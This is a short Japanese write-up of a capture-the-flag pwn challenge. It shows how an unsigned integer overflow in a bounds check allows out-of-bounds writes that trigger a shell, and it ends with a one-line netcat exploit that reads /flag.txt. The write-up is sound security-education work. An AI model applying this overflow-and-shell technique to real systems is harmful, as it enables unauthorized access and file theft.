# Alpaca-Llama Ranch

https://alpacahack.com/daily/challenges/alpaca-llama-ranch

## 問題の概要

SIGSEGV を発生させれば shell に execve される PWN 問題です。

サーバーの処理は次のようになっています。

- `unsigned alpaca, llama` に　`scanf("%u%*c",&alpaca);`, `scanf("%u%*c",&llama);` を読み込む
- `alpaca+llama > MAX_N_ANIMAL` なら `exit(1)` で終了
- `i`= `0` ～ `alpaca`、`alpaca` ～ `alpaca+llama` まで `long animal_numbers[MAX_N_ANIMAL]` に `scanf("%ld%*c",&animal_numbers[i++]);` を読み込む

## 解法

`alpaca+llama <= MAX_N_ANIMAL` が保証されるので範囲外アクセスができなさそうですが、例えば

- `alpaca = 2**32-1`
- `llama = 1`

とすれば `alpaca+llama` はオーバーフローして `0` になり、チェックをすり抜けて範囲外アクセスができます。

## 解答に使用したコード

```bash
(echo $((2 ** 32 - 1)); echo 1; yes 0 | head -n 600; echo "cat /flag.txt") | nc localhost 1337
```
